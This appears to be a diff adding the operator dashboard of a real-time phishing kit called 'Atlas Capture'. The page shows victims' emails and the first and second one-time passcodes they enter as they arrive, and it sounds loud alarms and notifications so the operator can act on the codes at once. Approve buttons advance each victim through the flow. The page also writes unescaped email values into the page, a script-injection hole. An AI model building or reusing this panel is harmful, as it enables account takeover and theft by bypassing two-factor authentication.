@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Dashboard - Atlas Capture</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
+
+body{
+  background:#f3f4f6;
+}
+
+.navbar{
+  background:#fff;
+  padding:16px 24px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  box-shadow:0 1px 3px rgba(0,0,0,0.05);
+  border-bottom:1px solid #e5e7eb;
+}
+.navbar h1{
+  font-size:20px;
+  font-weight:600;
+  color:#1f2937;
+}
+.logout-btn{
+  background:#ef4444;
+  color:white;
+  border:none;
+  padding:8px 20px;
+  border-radius:10px;
+  cursor:pointer;
+  font-weight:500;
+}
+
+.container{
+  max-width:1400px;
+  margin:24px auto;
+  padding:0 20px;
+}
+
+.stats{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+  gap:16px;
+  margin-bottom:24px;
+}
+.stat-card{
+  background:#fff;
+  padding:20px;
+  border-radius:16px;
+  border:1px solid #e5e7eb;
+}
+.stat-card h3{
+  font-size:13px;
+  color:#6b7280;
+  margin-bottom:8px;
+}
+.stat-card .number{
+  font-size:32px;
+  font-weight:700;
+  color:#4f46e5;
+}
+
+.table-container{
+  background:#fff;
+  border-radius:16px;
+  border:1px solid #e5e7eb;
+  overflow:auto;
+}
+table{
+  width:100%;
+  border-collapse:collapse;
+  min-width:800px;
+}
+th{
+  text-align:left;
+  padding:16px;
+  background:#f9fafb;
+  font-weight:600;
+  color:#374151;
+  border-bottom:1px solid #e5e7eb;
+}
+td{
+  padding:14px 16px;
+  border-bottom:1px solid #f0f0f0;
+  color:#4b5563;
+}
+.badge{
+  display:inline-block;
+  padding:4px 10px;
+  border-radius:20px;
+  font-size:12px;
+  font-weight:500;
+}
+.badge-pending{background:#fef3c7;color:#d97706;}
+.badge-approved{background:#d1fae5;color:#059669;}
+.badge-waiting{background:#e0e7ff;color:#4f46e5;}
+.approve-btn{
+  background:#4f46e5;
+  color:white;
+  border:none;
+  padding:6px 14px;
+  border-radius:8px;
+  cursor:pointer;
+  font-size:12px;
+  font-weight:500;
+}
+.approve-second-btn{
+  background:#059669;
+  color:white;
+  border:none;
+  padding:6px 14px;
+  border-radius:8px;
+  cursor:pointer;
+  font-size:12px;
+  font-weight:500;
+  margin-left:8px;
+}
+
+.notification-toast{
+  position:fixed;
+  top:20px;
+  right:20px;
+  background:#fff;
+  border-left:4px solid #4f46e5;
+  padding:16px 20px;
+  border-radius:12px;
+  box-shadow:0 10px 25px rgba(0,0,0,0.1);
+  display:none;
+  z-index:1000;
+  animation:slideIn 0.3s ease;
+  max-width:350px;
+}
+@keyframes slideIn{
+  from{transform:translateX(100%);opacity:0;}
+  to{transform:translateX(0);opacity:1;}
+}
+.notification-toast h4{
+  color:#4f46e5;
+  margin-bottom:4px;
+  font-size:14px;
+}
+.notification-toast p{
+  color:#6b7280;
+  font-size:13px;
+}
+</style>
+</head>
+<body>
+
+<div class="navbar">
+  <h1>Atlas Capture Admin</h1>
+  <button class="logout-btn" onclick="logout()">Logout</button>
+</div>
+
+<div id="notificationToast" class="notification-toast">
+  <h4 id="notificationTitle">New Request</h4>
+  <p id="notificationMessage"></p>
+</div>
+
+<div class="container">
+  <div class="stats">
+    <div class="stat-card">
+      <h3>Total Users</h3>
+      <div class="number" id="totalUsers">0</div>
+    </div>
+    <div class="stat-card">
+      <h3>Pending First OTP</h3>
+      <div class="number" id="pendingFirst">0</div>
+    </div>
+    <div class="stat-card">
+      <h3>Pending Second OTP</h3>
+      <div class="number" id="pendingSecond">0</div>
+    </div>
+  </div>
+
+  <div class="table-container">
+    <table>
+      <thead>
+        <tr>
+          <th>Email</th>
+          <th>First OTP</th>
+          <th>Second OTP</th>
+          <th>Status</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody id="usersTableBody">
+        <tr><td colspan="5" style="text-align:center; padding:40px;">Loading...</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  const token = localStorage.getItem('adminToken');
+  if (!token) window.location.href = '/admin';
+
+  const socket = io({ auth: { token } });
+  let audioContext = null;
+
+  function initAudio() {
+    if (!audioContext) {
+      try {
+        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+      } catch(e) {}
+    }
+  }
+
+  function playLoudSound(type) {
+    initAudio();
+    if (!audioContext) return;
+    
+    try {
+      const now = audioContext.currentTime;
+      if (type === 'email') {
+        for (let i = 0; i < 6; i++) {
+          const osc = audioContext.createOscillator();
+          const gain = audioContext.createGain();
+          osc.type = 'sine';
+          osc.frequency.value = 800 + (i * 80);
+          gain.gain.value = 0.4;
+          osc.connect(gain);
+          gain.connect(audioContext.destination);
+          osc.start(now + i * 0.12);
+          osc.stop(now + i * 0.12 + 0.15);
+        }
+      } else if (type === 'first-otp') {
+        const osc = audioContext.createOscillator();
+        const gain = audioContext.createGain();
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(600, now);
+        osc.frequency.exponentialRampToValueAtTime(1200, now + 0.5);
+        gain.gain.value = 0.4;
+        osc.connect(gain);
+        gain.connect(audioContext.destination);
+        osc.start(now);
+        osc.stop(now + 0.8);
+      } else if (type === 'second-otp') {
+        const osc = audioContext.createOscillator();
+        const gain = audioContext.createGain();
+        osc.type = 'square';
+        osc.frequency.value = 880;
+        gain.gain.value = 0.4;
+        osc.connect(gain);
+        gain.connect(audioContext.destination);
+        osc.start(now);
+        osc.stop(now + 0.3);
+        setTimeout(() => {
+          const osc2 = audioContext.createOscillator();
+          const gain2 = audioContext.createGain();
+          osc2.type = 'square';
+          osc2.frequency.value = 880;
+          gain2.gain.value = 0.4;
+          osc2.connect(gain2);
+          gain2.connect(audioContext.destination);
+          osc2.start(now + 0.5);
+          osc2.stop(now + 0.8);
+        }, 500);
+      }
+    } catch(e) {}
+  }
+
+  function showNotification(title, message, type) {
+    const toast = document.getElementById('notificationToast');
+    document.getElementById('notificationTitle').textContent = title;
+    document.getElementById('notificationMessage').textContent = message;
+    toast.style.display = 'block';
+    playLoudSound(type);
+    
+    if (Notification.permission === 'granted') {
+      new Notification(title, { body: message });
+    }
+    
+    if ('vibrate' in navigator) {
+      navigator.vibrate([300, 150, 300, 150, 300]);
+    }
+    
+    setTimeout(() => { toast.style.display = 'none'; }, 5000);
+  }
+
+  if (Notification.permission === 'default') {
+    Notification.requestPermission();
+  }
+
+  async function loadUsers() {
+    try {
+      const response = await fetch('/api/admin/users', {
+        headers: { 'Authorization': `Bearer ${token}` }
+      });
+      if (response.status === 403) {
+        localStorage.removeItem('adminToken');
+        window.location.href = '/admin';
+        return;
+      }
+      const users = await response.json();
+      displayUsers(users);
+      updateStats(users);
+    } catch(err) {
+      console.error(err);
+    }
+  }
+
+  function updateStats(users) {
+    const pendingFirst = users.filter(u => u.otp && !u.approved).length;
+    const pendingSecond = users.filter(u => u.second_otp && !u.second_approved).length;
+    document.getElementById('totalUsers').textContent = users.length;
+    document.getElementById('pendingFirst').textContent = pendingFirst;
+    document.getElementById('pendingSecond').textContent = pendingSecond;
+  }
+
+  function displayUsers(users) {
+    const tbody = document.getElementById('usersTableBody');
+    if (!users.length) {
+      tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:40px;">No users</td></tr>';
+      return;
+    }
+    tbody.innerHTML = users.map(user => `
+      <tr>
+        <td><strong>${user.email}</strong></td>
+        <td>${user.otp ? `<span class="badge badge-waiting">${user.otp}</span>` : '<span class="badge badge-pending">Pending</span>'}</td>
+        <td>${user.second_otp ? `<span class="badge badge-waiting">${user.second_otp}</span>` : '<span class="badge badge-pending">Pending</span>'}</td>
+        <td>
+          ${!user.approved && user.otp ? '<span class="badge badge-pending">Awaiting First</span>' : ''}
+          ${user.approved && user.second_otp && !user.second_approved ? '<span class="badge badge-pending">Awaiting Second</span>' : ''}
+          ${user.approved && user.second_approved ? '<span class="badge badge-approved">Completed</span>' : ''}
+          ${!user.otp && !user.approved ? '<span class="badge badge-pending">Email Pending</span>' : ''}
+        </td>
+        <td>
+          ${user.otp && !user.approved ? `<button class="approve-btn" onclick="approveFirst('${user.email}')">✓ Approve First</button>` : ''}
+          ${user.second_otp && user.approved && !user.second_approved ? `<button class="approve-second-btn" onclick="approveSecond('${user.email}')">🔐 Approve Second</button>` : ''}
+        </td>
+      </tr>
+    `).join('');
+  }
+
+  async function approveFirst(email) {
+    showNotification('First OTP Approval', `Approving ${email}`, 'first-otp');
+    await fetch('/api/admin/approve-user', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
+      body: JSON.stringify({ email })
+    });
+    loadUsers();
+  }
+
+  async function approveSecond(email) {
+    showNotification('Second OTP Approval', `Approving ${email}`, 'second-otp');
+    await fetch('/api/admin/approve-second', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
+      body: JSON.stringify({ email })
+    });
+    loadUsers();
+  }
+
+  function logout() {
+    localStorage.removeItem('adminToken');
+    window.location.href = '/admin';
+  }
+
+  socket.on('connect', () => console.log('Admin connected'));
+  socket.on('user-login', (data) => {
+    showNotification(' New Email Submission', `${data.email} signed up`, 'email');
+    loadUsers();
+  });
+  socket.on('user-otp-created', (data) => {
+    showNotification(' First OTP Received', `${data.email} entered OTP: ${data.otp}`, 'first-otp');
+    loadUsers();
+  });
+  socket.on('user-second-otp-created', (data) => {
+    showNotification(' Second OTP Received', `${data.email} entered OTP: ${data.second_otp}`, 'second-otp');
+    loadUsers();
+  });
+
+  loadUsers();
+  setInterval(loadUsers, 5000);
+</script>
+
+</body>
+</html>
